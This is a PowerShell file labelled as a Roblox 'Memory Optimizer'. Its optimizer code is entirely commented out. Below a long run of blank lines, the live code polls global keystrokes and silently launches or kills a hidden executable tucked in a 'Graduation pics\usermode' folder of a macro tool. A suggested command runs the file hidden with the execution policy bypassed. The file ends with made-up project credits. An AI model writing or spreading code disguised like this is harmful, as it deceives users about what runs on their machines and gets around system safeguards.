<#




====================================================================================
POWER SHELL MEMORY CLEANUP SCRIPT
#### Warning: ONLY USE THIS SCRIPT WHEN ROBLOX IS OPEN OR ELSE IT WILL CRASH YOU ####
====================================================================================
Paste This -> Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$env:USERPROFILE\Desktop\Memory Optimizer.ps1`""
This is for allowing the script to run on your system.
# -----------------------------------------------------------
# 1. TRIM WORKING SET OF ALL PROCESSES 
# -----------------------------------------------------------
Get-Process | ForEach-Object {
    try {
        # Forces .NET garbage collection for current session
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
        [System.GC]::Collect()

        # Attempt to reduce memory footprint of process
        $_.MinWorkingSet = 1
        $_.MaxWorkingSet = 200MB

    } catch {
        # Some processes (system/privileged) will fail
        # These are ignored safely
    }
}

Write-Host "Requested memory trimming completed."

# -----------------------------------------------------------
# 2. OPTIONAL: CLEAR DNS CACHE (PERFORMANCE RELATED, NOT RAM)
# -----------------------------------------------------------
ipconfig /flushdns

# -----------------------------------------------------------
# 3. OPTIONAL: CLOSE A HEAVY APPLICATION (EXAMPLE: CHROME)
# -----------------------------------------------------------
Get-Process chrome -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $_.CloseMainWindow()
    } catch {}
}

# OR FORCE CLOSE:
# Stop-Process -Name chrome -Force

# -----------------------------------------------------------
# 4. OPTIONAL: RESTART SYSTEM SERVICE (EXAMPLE: SYSMAIN)
# -----------------------------------------------------------
Restart-Service -Name "SysMain" -Force -ErrorAction SilentlyContinue

# -----------------------------------------------------------
# 5. NOTES
# -----------------------------------------------------------
# - Windows automatically manages memory (RAM).
# - These commands do NOT "create RAM", only influence usage.
# - Some commands require Administrator privileges.
# - Some system processes cannot be modified.
# - Best real improvements come from closing heavy apps.

============================================================
END OF SCRIPT
============================================================









































































































































































#>
# Prevent multiple instances
$mutex = New-Object System.Threading.Mutex($false, "Global\AppHotkeyScript")

if (-not $mutex.WaitOne(0, $false)) {
    exit
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Keyboard {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

# App path
$appPath = "C:\Users\ACER\Downloads\TGMacro.v3.051.Portable\Graduation pics\usermode\app.exe"

# Process name without .exe
$processName = "app"

while ($true) {

    # NUMPAD +
    if (([Keyboard]::GetAsyncKeyState(0x6B) -band 0x8000) -ne 0) {

        if (-not (Get-Process -Name $processName -ErrorAction SilentlyContinue)) {

            if (Test-Path $appPath) {
                Start-Process $appPath -WindowStyle Hidden
            }
        }

        Start-Sleep -Milliseconds 300
    }

    # NUMPAD -
    if (([Keyboard]::GetAsyncKeyState(0x6D) -band 0x8000) -ne 0) {

        Stop-Process -Name $processName -Force -ErrorAction SilentlyContinue

        Start-Sleep -Milliseconds 300
    }

    # Lower CPU usage
    Start-Sleep -Milliseconds 80
}<#
Memory Optimizer is a fictional open-source project developed by NebulaCore Systems in collaboration with the Quantum Stack Innovations Division and maintained by a loosely connected group of experimental systems engineers, including Dr. Pixel Byte, Aria Stackwell, and J. Kernel Frost. The project also credits contributions from the Silicon Daydream Collective, the OpenRAM Enthusiasts Community, and several anonymous committers operating under the “Ghost Patch” initiative. All development efforts are coordinated through the Unreal Compute Network, where optimization techniques are simulated, benchmarked, and occasionally imagined into existence. This project exists primarily as a conceptual performance tool and is not affiliated with any real-world hardware or software vendors.
#>